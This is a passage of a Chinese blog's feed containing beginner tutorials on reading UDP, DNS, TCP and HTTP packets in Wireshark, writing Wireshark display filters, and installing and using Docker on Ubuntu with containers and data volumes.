Datagram"></a>User Datagram</h4><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316174024218.png" class><p>这里是源端口与目的端口</p><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316173924969.png" class><p>这里就是十六进制信息</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS是域名解析协议，就是把具体的url转化为IP，接下来我们抓包试试看</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316174642420.png" class><p>可以看到，这里有很多包，info里有详细的内容，</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316175152003.png" class><p>可以看到UDP的端口默认53，打到DNS服务器51132端口</p><h3 id="Domain-Name"><a href="#Domain-Name" class="headerlink" title="Domain Name"></a>Domain Name</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316175935998.png" class><p>这里的Question是问题是指问题数目，有时候会访问多个IP</p><p>RRS: 回答数</p><p>authority RRS： 授权记录 </p><p>ADDITIONAL RRS: 附加记录</p><p>下面我们看看query和answears</p><p>这个分别是查询和回复报文</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316180135125.png" class><p>&#x2F;</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316180054451.png" class><p>可以看到：这个查询和回复十分明了，我们就不进行讲解了</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>如下图，为一些TCP的报文段</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316180523773.png" class><p>可以看到，TCP请求种类繁多</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316180734368.png" class><p>我们可以右键一个包，然后点击追踪stream流，就可以把和它相关的包都给找出来</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316181039224.png" class><p>如下：</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316181128838.png" class><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316181954063.png" class><p>可以看到：这里记录了源端口与目的端口，</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316182202815.png" class><p>如图为三次握手的具体过程</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316182359117.png" class><p>可以看到，这里对上图进行了完美诠释从请求号到请求报文段都是如此</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316182655126.png" class><p>如图对HTTP报文进行分析</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316182753793.png" class><p>这里就是一些很常规的请求行、请求头、请求尾的内容。这里不同的同学可以去看看HTTP协议</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上篇文章我们讲了如何用wireshark抓包并且进行过滤，但是抓到包不会看这是没有用的，这节课我们讲如何对不同种类的包进行分析。&lt;/p&gt;
&lt;p&gt;下面我将对不同种类的包进行讲解&lt;/p&gt;
&lt;h2 id=&quot;ARP&quot;&gt;&lt;a href=&quot;#ARP&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="抓包" scheme="http://example.com/tags/%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>Wireshark抓包基础</title>
    <link href="http://example.com/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/</id>
    <published>2022-03-15T07:51:44.000Z</published>
    <updated>2022-03-17T01:23:36.736Z</updated>
    
    <content type="html"><![CDATA[<p>这是<a href="https://www.wireshark.org/#download">下载路径</a>，这里不作讲解，我们直接打开软件如图：</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315162610586.png" class><p>可以看到可选项非常多，我们重点关注</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315162702297.png" class><p>选择WLAN就可以，表示无线网连接</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315162954778.png" class><p>双击后如图，可以看到现在有非常多的数据包正在进行传输，</p><p>点击左侧的那个蓝色小按钮可以看到如下内容：</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315163150380.png" class><p>点击管理显示过滤器</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315163804075.png" class><p>如图，左侧为自定义的名称，右侧为一些过滤条件，关于过滤条件我会细讲</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>表达式组合</p><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315164228353.png" class><h3 id="针对ip"><a href="#针对ip" class="headerlink" title="针对ip"></a>针对ip</h3><ul><li>对源ip地址过滤</li></ul><p>ip.src &#x3D;&#x3D; 192.168.0.1</p><ul><li>对目的地址过滤</li></ul><p>ip.dst &#x3D;&#x3D; 192.168.0.1</p><ul><li>对源地址或者目的地址进行过滤</li></ul><p>ip.addr &#x3D;&#x3D; 192.168.0.1</p><ul><li>如果想排除以上的数据包，只需要将其用括号囊括，然后使用 “!” 即可</li></ul><p>!(ip.addr &#x3D;&#x3D; 192.168.0.1)</p><h3 id="针对协议"><a href="#针对协议" class="headerlink" title="针对协议"></a>针对协议</h3><p><strong>注意！！！！！</strong>这里的协议都是小写，不要用大写</p><ul><li>获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可</li></ul><p>http</p><ul><li>捕获多种协议的数据包</li></ul><p>http or telnet</p><ul><li>排除某种协议的数据包</li></ul><p>not arp   或者   !tcp</p><h3 id="针对端口"><a href="#针对端口" class="headerlink" title="针对端口"></a>针对端口</h3><ul><li>捕获某一端口的数据包（以tcp协议为例）</li></ul><p>tcp.port &#x3D;&#x3D; 80</p><ul><li>捕获多端口的数据包，可以使用and来连接，下面是捕获高于某端口的表达式（以udp协议为例）</li></ul><p>udp.port &gt;&#x3D; 2048</p><h3 id="针对长度和内容的过滤"><a href="#针对长度和内容的过滤" class="headerlink" title="针对长度和内容的过滤"></a>针对长度和内容的过滤</h3><p>针对长度的过虑（这里的长度指定的是数据段的长度）</p><p>udp.length &lt; 20</p><p>http.content_length &lt;&#x3D;30</p><h3 id="针对url的过滤"><a href="#针对url的过滤" class="headerlink" title="针对url的过滤"></a>针对url的过滤</h3><p>http.request.uri matches “user” (请求的uri中包含“user”关键字的)</p><h3 id="针对http请求的一些过滤实例"><a href="#针对http请求的一些过滤实例" class="headerlink" title="针对http请求的一些过滤实例"></a>针对http请求的一些过滤实例</h3><ul><li>过滤出请求地址中包含“user”的请求，不包括域名；</li></ul><p>http.request.uri contains “User”</p><ul><li>精确过滤域名</li></ul><p>http.host&#x3D;&#x3D;baidu.com</p><ul><li>模糊过滤域名</li></ul><p>http.host contains “baidu”</p><ul><li>过滤请求的content_type类型</li></ul><p>http.content_type &#x3D;&#x3D;”text&#x2F;html”</p><ul><li>过滤http请求方法</li></ul><p>http.request.method&#x3D;&#x3D;”POST”</p><ul><li>过滤tcp端口</li></ul><p>http &amp;&amp; tcp.port&#x3D;&#x3D;80 or tcp.port&#x3D;&#x3D;5566</p><ul><li>过滤http响应状态码</li></ul><p>http.response.code&#x3D;&#x3D;302</p><ul><li>过滤含有指定cookie的http数据包</li></ul><p>http.cookie contains “userid”</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><img src="/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%9F%BA%E7%A1%80/image-20220315173626612.png" class><p>遇到问题了…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是&lt;a href=&quot;https://www.wireshark.org/#download&quot;&gt;下载路径&lt;/a&gt;，这里不作讲解，我们直接打开软件如图：&lt;/p&gt;
&lt;img src=&quot;/2022/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%9</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="抓包" scheme="http://example.com/tags/%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>Docker基础使用</title>
    <link href="http://example.com/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</id>
    <published>2022-03-15T07:32:32.000Z</published>
    <updated>2022-03-15T07:40:47.678Z</updated>
    
    <content type="html"><![CDATA[<p>本文章主要讲解docker的安装、基础命令以及容器数据卷配置等。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>环境：Ubuntu 20.04</p></blockquote><p>**注意:**所有安装过程最好在root权限下进行</p><p>首先，更新软件包索引，并且安装必要的依赖软件，来添加一个新的 HTTPS 软件源：</p><figure class="highlight cmd"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs cmd">sudo apt update<br>sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br></code></pre></td></tr></table></figure><p>使用下面的 <code>curl</code> 导入源仓库的 GPG key：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//</span>download.docker.com<span class="hljs-regexp">/linux/u</span>buntu/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure><p>将 Docker APT 软件源添加到你的系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br></code></pre></td></tr></table></figure><p>现在，Docker 软件源被启用了，你可以安装软件源中任何可用的 Docker 版本。</p><p><strong>注意</strong></p><p>如果在 <code>/etc/docker</code>目录下没有 <code>daemon.json</code>就去自行创建</p><p>先运行命令</p><p><code>touch daemon.json</code></p><p>然后填写以下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;insecure-registries&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;192.168.2.2:8080&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;oom-score-adjust&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1000</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;exec-opts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;registry-mirrors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;https://ucjisdvf.mirror.aliyuncs.com&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;storage-driver&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;overlay2&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;storage-opts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;overlay2.override_kernel_check=true&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;log-level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warn&quot;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;log-driver&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;json-file&quot;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;log-opts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <br>     <span class="hljs-attr">&quot;max-size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100m&quot;</span><span class="hljs-punctuation">,</span> <br>     <span class="hljs-attr">&quot;max-file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;data-root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/docker&quot;</span> <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>我这里安装了最新的Docker版本，如果有想安装指定版本的的可以自行查看</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt <span class="hljs-keyword">update</span><br>sudo apt install docker-<span class="hljs-keyword">ce</span> docker-<span class="hljs-keyword">ce</span>-cli containerd.io<br></code></pre></td></tr></table></figure><p>使用以下命令开启docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service docker <span class="hljs-literal">start</span> <br></code></pre></td></tr></table></figure><p>一旦Docker 服务将会自动启动。你可以输入下面的命令，验证它：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl status docker</span><br></code></pre></td></tr></table></figure><p>输出将会类似下面这样：</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315134519801.png" class><p>如果你想阻止 Docker 自动更新，锁住它的版本：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sudo apt-mark hold docker-ce<br></code></pre></td></tr></table></figure><h3 id="非root用户执行docker"><a href="#非root用户执行docker" class="headerlink" title="非root用户执行docker"></a>非root用户执行docker</h3><p>默认情况下，只有 root 或者 有 sudo 权限的用户可以执行 Docker 命令。</p><p>想要以非 root 用户执行 Docker 命令，你需要将你的用户添加到 Docker 用户组，该用户组在 Docker CE 软件包安装过程中被创建。想要这么做，输入：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br></code></pre></td></tr></table></figure><p><code>$USER</code>是一个环境变量，代表当前用户名。</p><p>登出，并且重新登录，以便用户组会员信息刷新。</p><h3 id="验证安装过程"><a href="#验证安装过程" class="headerlink" title="验证安装过程"></a>验证安装过程</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker container <span class="hljs-built_in">run</span> hello-world<br></code></pre></td></tr></table></figure><p>如果本地没有该镜像，这个命令将会下载测试镜像，在容器中运行它，打印出 “Hello from Docker”，并且退出。</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315135323553.png" class><h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315135918749.png" class><h3 id="daemon-操作docker服务"><a href="#daemon-操作docker服务" class="headerlink" title="daemon(操作docker服务)"></a>daemon(操作docker服务)</h3><p>启动</p><p>service docker start </p><p>关闭</p><p>service docker start </p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315140243394.png" class><p>查看状态</p><p>service docker status</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315140357355.png" class><p>重启</p><p>service docker restart</p><p>开机自启动</p><p>sudo systemctl enable docker</p><h3 id="image-操作镜像"><a href="#image-操作镜像" class="headerlink" title="image(操作镜像)"></a>image(操作镜像)</h3><p>docker image 查看本地镜像</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315140919401.png" class><p>可以看到我这里啥都没有，不用担心啊</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>docker searck xxx</p><p>xxx为要搜索的镜像</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315141121723.png" class><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>docker pull pro:ver</p><p>pro为要下载的东西;ver即version即版本号，默认为最高版本</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315141515632.png" class><p>如图redis已经下载好了</p><p>可以在<a href="https://hub.docker.com/%E6%90%9C%E7%B4%A2%E9%9C%80%E8%A6%81%E7%9A%84%E7%89%88%E6%9C%AC">https://hub.docker.com/搜索需要的版本</a></p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>与下载类似</p><p>docker rmi pro:ver</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315142128410.png" class><p>docker rmi IMAGE ID</p><p>即加上IMAGE ID 也可以</p><h3 id="container-操作容器"><a href="#container-操作容器" class="headerlink" title="*container(操作容器)"></a>*container(操作容器)</h3><p>我们上节已经看过如何创建镜像了，把多个镜像放在一个容器里面就是我们想要的环境了，所以说能操作容器至关重要</p><p>docker run -i -t –name&#x3D;springboot2.3 redis &#x2F;bin&#x2F;bash</p><p>-i表示一直运行容器</p><p>-t是为了让我们去接受后续的命令</p><p>– name 是起名字</p><p>redis表示当前需要加载的东西，在这里我加了redis，可以在:后面加版本，比如redis:5.0</p><p>&#x2F;bin&#x2F;bash表示打开运行脚本</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315143743403.png" class><p>可以看到这里的前缀已经改变了，这表示此时我们已经进入容器内部</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315144108011.png" class><p>这里可以看到，docker内部其实与Linux十分相似</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315144203061.png" class><h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><p>docker ps -a</p><p>-a表示展示也历史容器，如果不加a就只展示当前容器</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315144337598.png" class><h4 id="创建（守护式–推荐）"><a href="#创建（守护式–推荐）" class="headerlink" title="创建（守护式–推荐）"></a>创建（守护式–推荐）</h4><p>docker run -i -d –name&#x3D;springboot2.3 </p><p>这里把-t改成了-d,表示后台打开docker,这样docker会一直运行，不会因为我们exit容器就消失了</p><p>这里可以使用docker ps -a查看</p><h4 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h4><p>docker exec -it springboot2.3 &#x2F;bin&#x2F;bash</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315144916932.png" class><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>docker start name</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315145341070.png" class><h4 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h4><p>docker stop name</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315145217330.png" class><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><p>docker rm name</p><p>这里的删除不能删除正在运行的容器，最好先把它停止后再运行</p><h3 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h3><p>我们来思想一个问题</p><ul><li>docker删除后，数据是否还在？</li></ul><p>我们知道，一旦docker部署，数据都存储再容器里，此时数据就会消失，这太糟糕了</p><ul><li>docker和外部机器可以直接交换文件嘛？（docker和Linux主机）</li></ul><p>不可以</p><ul><li>容器之间直接数据交互可以吗</li></ul><p>不可以</p><p>以上三个问题引出了很多问题，比如一旦docker用不了，那数据就没了，数据不能相互交互。。。那该怎么完成呢？</p><p><strong>容器数据卷</strong></p><p>数据卷是宿主机中的一个目录或文件</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315150325837.png" class><p>相当于容器和数据卷的数据相互同步，这样上面三个问题就迎刃而解，一个数据卷可以被多个容器挂在，一个容器可以被挂载多个数据卷</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>docker run …  -v 宿主机目录（文件）：容器内目录（文件）</p><ul><li>目录必须是绝对路径</li><li>目录不存在就会自动创建</li><li>可挂载多个数据卷</li></ul><p>docker run -it –name&#x3D;c1 -v &#x2F;root&#x2F;data:&#x2F;root&#x2F;data_container redis &#x2F;bin&#x2F;bash</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315151047744.png" class><p>查看容器内文件</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315151255297.png" class><p>挂载多个容器</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315151729896.png" class><h3 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h3><ul><li>多个容器进行数据交换</li></ul><p>可以让多个容器挂载一个数据卷，实现间接共享，但这样十分麻烦，我们一般不用，推荐使用容器数据卷</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315152209873.png" class><p>如图：c3就为数据卷容器</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><ol><li>先配置c3</li></ol><p>docker run -it –name&#x3D;c3 -v &#x2F;volume redis</p><img src="/2022/03/15/Docker/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20220315152649165.png" class><ol start="2"><li>创建c1 &amp; c2,</li></ol><p>docker run -it –name&#x3D;c1 –volumes-from c3 redis </p><p>docker run -it –name&#x3D;c2 –volumes-from c3 redis </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文章主要讲解docker的安装、基础命令以及容器数据卷配置等。&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;环境：Ubuntu 20.04&lt;/</summary>
      
    
    
    
    <category term="Docker" scheme="http://example.com/categories/Docker/"/>
    
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
</feed>
